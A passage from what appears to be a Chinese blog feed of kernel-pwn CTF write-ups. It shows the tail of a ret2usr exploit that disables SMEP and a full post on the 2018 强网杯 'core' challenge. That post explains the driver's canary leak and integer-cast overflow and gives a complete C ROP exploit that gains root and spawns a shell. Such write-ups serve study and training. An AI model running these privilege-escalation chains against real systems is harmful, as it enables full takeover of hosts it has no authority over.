<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>    &#123;<br>        vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>    &#125;   <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]set off to %lx\033[0m\n&quot;</span>,idx);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, idx);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]read to buf.\033[0m\n&quot;</span>);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]copy from user with size: %lx\033[0m\n&quot;</span>,size);<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span>* (*pkc)(<span class="hljs-type">int</span>) = prepare_kernel_cred_addr;<br>    <span class="hljs-type">void</span> (*cc)(<span class="hljs-type">char</span>*) = commit_creds_addr;<br>    (*cc)((*pkc)(<span class="hljs-number">0</span>));<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br><span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);<br><span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/core error!\033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>&#125;<br>set_off(fd, <span class="hljs-number">0x40</span>);<br><span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>core_read(fd, buf);<br><span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,canary);<br><br><span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">int</span> i;<br><span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>&#123;<br>    rop[i] = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (i==<span class="hljs-number">8</span>)rop[i]=canary;<br>&#125;<br>rop[i++] = <span class="hljs-number">0xffffffff8106669c</span> + offset;<span class="hljs-comment">// mov rax, cr4; test ah, 0x20; jne 0x2666aa; add rsp, 8; pop rbx; ret;</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset;<span class="hljs-comment">// pop rdi; ret;</span><br>rop[i++] = <span class="hljs-number">0xffffffffffcfffff</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff8102b45b</span> + offset;<span class="hljs-comment">// and rax, rdi; ret;</span><br><br>rop[i++] = <span class="hljs-number">0xffffffff81002515</span> + offset;<span class="hljs-comment">// mov cr4, rax; push rcx; popfq; ret;</span><br><br>rop[i++] = (<span class="hljs-type">size_t</span>)get_root;<br><br>rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>rop[i++] = <span class="hljs-number">0</span>;<br><br>rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br><br>rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br><br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp;<br>rop[i++] = user_ss;<br><br>write(fd, rop, <span class="hljs-number">0x800</span>);<br>core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><p>成功提权到root</p><p><img src="/2022/11/08/0x03kenelRet2usr/bypassgetroot.png" alt="bypassgetroot"></p><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>kernel pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ret2usr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0x02 kernel ROP-base</title>
    <link href="/2022/11/05/0x02kernelROP/"/>
    <url>/2022/11/05/0x02kernelROP/</url>
    
    <content type="html"><![CDATA[<h2 id="前言：">前言：</h2><p>本篇是关于kernel ROP的的第一篇</p><p>内核ROP与用户态ROP的区别就是变为了要rop出commit_creds(prepare_kernel_cred(0))</p><p>且写脚本从用户态的用python脚本与程序交互，变为了c程序脚本与内核进行交互</p><h2 id="2018-强网杯-core">2018 强网杯 - core</h2><p>参考<a href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/rop/#kernel-rop-2018-core">wiki</a></p><h3 id="0x01文件分析">0x01文件分析</h3><p>下载附件，有四个文件</p><p>bzImage是压缩gzip压缩的内核文件</p><p>core.cpio是压缩的文件系统</p><p>start.sh是启动脚本</p><p>vmlinux是静态编译未压缩的内核文件</p><p><img src="/2022/11/05/0x02kernelROP/2018core1.png" alt="2018core1"></p><p>我们可以从vmlinux中寻找gadget</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">time ropper --file ./vmlinux --nocolor &gt; g1<br></code></pre></td></tr></table></figure><p>当然题目没有vmlinux的话，我们可以用 <a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux">extract-vmlinux</a> 解压bzImage</p><p>使用方法：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure><h4 id="1-观察start-sh"><a href="http://1.xn--start-5t8i245y.sh">1.观察start.sh</a></h4><p>应该要知道开启了kaslr保护，然后那个-m要改内存从64到128，不然无法启动</p><p><img src="/2022/11/05/0x02kernelROP/2018core2.png" alt="2018core2"></p><h4 id="2-解压-cpio观察init">2.解压.cpio观察init</h4><p>解压前要先加.gz后缀，不然gunzip无法识别</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">mkdir core<br>cd core<br>mv ../core.cpio core.cpio.gz<br>gunzip ./core.cpio.gz<br>cpio -idm &lt; ./core.cpio<br></code></pre></td></tr></table></figure><p>可以看到就是挂载一些目录，我们把poweroff定时120关机给注释掉，方便调试</p><p><img src="/2022/11/05/0x02kernelROP/2018core3.png" alt="2018core3"></p><p><strong>要特别注意的语句：</strong></p><p><code>cat /proc/kallsyms &gt; /tmp/kallsyms</code></p><p>把 <code>kallsyms</code> 的内容保存到了 <code>/tmp/kallsyms</code> 中</p><p><code>echo 1 &gt; /proc/sys/kernel/kptr_restrict</code></p><p>kptr_restrict设为1，就不能通过/proc/kallsyms查看内核符号的地址，但是前一句已经把它写入了/tmp/kallsyms</p><p><code>echo 1 &gt; /proc/sys/kernel/dmesg_restrict</code></p><p>dmesg_restrict设为1后，无特权的用户是无法使用dmesg查看来自内核日志缓冲区的消息</p><p><code>insmod /core.ko</code></p><p>可以看到<code>insmod</code>命令载入了core.ko模块，重点关注这模块</p><h4 id="3-观察驱动core-ko">3.观察驱动core.ko</h4><p>开启了canary</p><h4 id="2018core4"><img src="/2022/11/05/0x02kernelROP/2018core4.png" alt="2018core4"></h4><p><strong>ida拿出来分析</strong></p><p>__int64 init_module()创建了/porc/core</p><p>exit_core()删除了创建的core</p><p>__int64 __fastcall core_ioctl()有三个选项，分别调用 <strong>core_read()</strong>，<strong>core_copy_func()</strong> 和设置全局变量 <strong>off</strong></p><p><strong>core_read():</strong></p><p>这个函数是往&amp;v5[off]写0x40长度到用户空间</p><p>但是off我们能控制，能泄露指定地址</p><p><img src="/2022/11/05/0x02kernelROP/2018core5.png" alt="2018core5"></p><p><strong>core_copy_func():</strong></p><p>qmemcpy(v2,&amp;name,(unsigned_int16)a1)</p><p>就是把全局变量name拷贝a1长度到局部变量v2</p><p>可以看到我们传的a1是int64，而qmemcpy用的是强转的unsigned int16</p><p>我们输一个大负数绕过前面63检测，而强转后变为一个合理的够长的长度，可以造成栈溢出</p><p><img src="/2022/11/05/0x02kernelROP/2018core6.png" alt="2018core6"></p><p><strong>core_write():</strong></p><p>可以往全局变量name里写a2地址上小于等于0x800长度的值，</p><p><img src="/2022/11/05/0x02kernelROP/2018core7.png" alt="2018core7"></p><h3 id="0x02攻击步骤">0x02攻击步骤</h3><p>1.保存用户态寄存器值</p><p>2.获取<code>prepare_kernel_cred</code>，<code>commit_creds</code>的地址</p><p>3.泄露<code>canary</code></p><p>4.栈溢出写入<code>rop</code>执行<code>commit_creds(prepare_kernel_cred(0))</code>，获得root后着陆回用户态起shell</p><h3 id="0x03调试方法">0x03调试方法</h3><p><a href="https://x3h1n.github.io/2019/07/04/2018%E5%BC%BA%E7%BD%91%E6%9D%AF-core/">参考</a></p><p>start.sh启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /sys/module/core/sections/.text<br></code></pre></td></tr></table></figure><p>在qemu中查找core.ko的.text段的地址</p><p><img src="/2022/11/05/0x02kernelROP/2018core11.png" alt="2018core11"></p><p>启动自己解压缩bzimage里面的./vmlinux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo gdb ./vmlinux -q<br></code></pre></td></tr></table></figure><p>接着<code>add-symbol-file ./core.ko 0xffffffffc0345000</code></p><p>载入core.ko的符号地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash">add-symbol-file ./core.ko 0xffffffffc0345000</span><br>add symbol table from file &quot;./core.ko&quot; at<br>.text_addr = 0xffffffffc0345000<br>Reading symbols from ./core.ko...<br>(No debugging symbols found in ./core.ko)<br></code></pre></td></tr></table></figure><p>然后连接端口</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">target remote localhost:1234<br></code></pre></td></tr></table></figure><p>我们就能断点函数名了，配合命令continue,然后运行程序就能停在指定函数</p><h3 id="0x04exp">0x04exp</h3><p><strong>解释下rop部分：</strong></p><p>这部分执行完后rax变为了prepare_kernel_cred_addr-&gt;0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset; <span class="hljs-comment">// pop rdi; ret</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = prepare_kernel_cred_addr;         <span class="hljs-comment">// prepare_kernel_cred(0)</span><br>    <br></code></pre></td></tr></table></figure><p>假设定这部分rop链为1，2，3</p><p>pop rdx使rdx=rop2，接着ret到rop2</p><p>pop rcx使rcx=rop3，接着ret到rop3</p><p>mov rdi,rax使rdi=prepare_kernel_cred_addr-&gt;0，然后call rdx，也就是跳转到rop2</p><p>pop rcx使rcx=rop3，接着ret就是执行commit_creds_addr了（rdi已经控制为了prepare_kernel_cred_addr-&gt;0）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff810a0f49</span> + offset; <span class="hljs-comment">// pop rdx; ret  1</span><br>rop[i++] = <span class="hljs-number">0xffffffff81021e53</span> + offset; <span class="hljs-comment">// pop rcx; ret  2</span><br>rop[i++] = <span class="hljs-number">0xffffffff8101aa6a</span> + offset; <span class="hljs-comment">// mov rdi, rax; call rdx;  3</span><br>rop[i++] = commit_creds_addr;<br></code></pre></td></tr></table></figure><p>接着就是用swapgs，iretq着陆回用户态，起shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>rop[i++] = <span class="hljs-number">0</span>;<br>rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br>rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br>rop[i++] = user_cs;<br>rop[i++] = user_rflags;<br>rop[i++] = user_sp;<br>rop[i++] = user_ss;<br></code></pre></td></tr></table></figure><p>rop：padding–&gt;canary-&gt;commit_creds(prepare_kernel_cred(0))-&gt;swapgs-&gt;iretq-&gt;system(“”/bin/sh&quot;)</p><p><strong>完整exp：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><br><span class="hljs-type">size_t</span> user_cs,user_ss,user_sp,user_rflags;<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><br><span class="hljs-comment">//in order to find the symbols of &quot;commit_creds,prepare_kernel_cred&quot;</span><br><span class="hljs-type">size_t</span> vmlinux_base=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> commit_creds_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">size_t</span> prepare_kernel_cred_addr=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">find_symbols</span><span class="hljs-params">()</span><br>&#123;<br>    FILE* kallsyms_fd = fopen(<span class="hljs-string">&quot;/tmp/kallsyms&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span>(!kallsyms_fd)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /tmp/kallsyms error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful open /tmp/kallsyms!\033[0m\n&quot;</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x50</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>        <br><br>    <span class="hljs-keyword">while</span>(fgets(buf,<span class="hljs-number">0x50</span>,kallsyms_fd))<br>    &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;commit_creds&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x11</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;commit_creds_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] commit_creds symbols addr=%p\033[0m\n&quot;</span>,commit_creds_addr);<br>            <br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">strstr</span>(buf,<span class="hljs-string">&quot;prepare_kernel_cred&quot;</span>))<br>        &#123;<br>            <span class="hljs-type">char</span> s[<span class="hljs-number">0x10</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>            <span class="hljs-built_in">strncpy</span>(s,buf,<span class="hljs-number">0x10</span>);<br>            <span class="hljs-built_in">sscanf</span>(s, <span class="hljs-string">&quot;%llx&quot;</span>, &amp;prepare_kernel_cred_addr);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] prepare_kernel_cred symbols addr=%p\033[0m\n&quot;</span>,prepare_kernel_cred_addr);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>((commit_creds_addr&amp;prepare_kernel_cred_addr))<br>    &#123;<br>        vmlinux_base=commit_creds_addr<span class="hljs-number">-0x9c8e0</span>;<br>    &#125;   <br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_off</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> idx)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]set off to %lx\033[0m\n&quot;</span>,idx);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889C</span>, idx);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">char</span> *buf)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]read to buf.\033[0m\n&quot;</span>);<br>    <br><br>    ioctl(fd, <span class="hljs-number">0x6677889B</span>, buf);<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">core_copy_func</span><span class="hljs-params">(<span class="hljs-type">int</span> fd, <span class="hljs-type">long</span> <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+]copy from user with size: %lx\033[0m\n&quot;</span>,size);<br>    ioctl(fd, <span class="hljs-number">0x6677889A</span>, size);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    save_status();<br>    find_symbols();<br>    <span class="hljs-type">size_t</span> raw_vmlinux_base = <span class="hljs-number">0xffffffff81000000</span>;<br>    <span class="hljs-type">ssize_t</span> offset=vmlinux_base-raw_vmlinux_base;<span class="hljs-comment">//ssize_t=long int,size_t=unsign int</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+] offest=%lx\033[0m\n&quot;</span>,offset);<br><br>    <span class="hljs-type">int</span> fd=open(<span class="hljs-string">&quot;/proc/core&quot;</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span>(fd&lt;<span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[X]open /proc/core error!\033[0m\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>    &#125;<br>    set_off(fd, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">char</span> buf[<span class="hljs-number">0x40</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    core_read(fd, buf);<br>    <span class="hljs-type">size_t</span> canary = ((<span class="hljs-type">size_t</span> *)buf)[<span class="hljs-number">0</span>];<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]canary=%p\033[0m\n&quot;</span>,canary);<br>    <br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> i;<br>    <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++)<br>    &#123;<br>        rop[i] = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (i==<span class="hljs-number">8</span>)rop[i]=canary;<br>    &#125;<br>    rop[i++] = <span class="hljs-number">0xffffffff81000b2f</span> + offset; <span class="hljs-comment">// pop rdi; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    rop[i++] = prepare_kernel_cred_addr;         <span class="hljs-comment">// prepare_kernel_cred(0)</span><br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff810a0f49</span> + offset; <span class="hljs-comment">// pop rdx; ret</span><br>    rop[i++] = <span class="hljs-number">0xffffffff81021e53</span> + offset; <span class="hljs-comment">// pop rcx; ret</span><br>    rop[i++] = <span class="hljs-number">0xffffffff8101aa6a</span> + offset; <span class="hljs-comment">// mov rdi, rax; call rdx; </span><br>    rop[i++] = commit_creds_addr;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81a012da</span> + offset; <span class="hljs-comment">// swapgs; popfq; ret</span><br>    rop[i++] = <span class="hljs-number">0</span>;<br>    <br>    rop[i++] = <span class="hljs-number">0xffffffff81050ac2</span> + offset; <span class="hljs-comment">// iretq; ret; </span><br>    <br>    rop[i++] = (<span class="hljs-type">size_t</span>)spawn_shell;         <span class="hljs-comment">// rip </span><br>    <br>    rop[i++] = user_cs;<br>    rop[i++] = user_rflags;<br>    rop[i++] = user_sp;<br>    rop[i++] = user_ss;<br>    <br>    write(fd, rop, <span class="hljs-number">0x800</span>);<br>    core_copy_func(fd, <span class="hljs-number">0xffffffffffff0000</span> | (<span class="hljs-number">0x100</span>));<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/05/0x02kernelROP/2018coreROOT.png" alt="2018coreROOT"></p><script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script>]]></content>
    
    
    <categories>
      
      <category>kernel pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kernelROP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>0x01 kernel学习</title>
    <link href="/2022/11/04/0x01kernel%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/11/04/0x01kernel%E5%AD%A6%E4%B9%A0/</url>
    
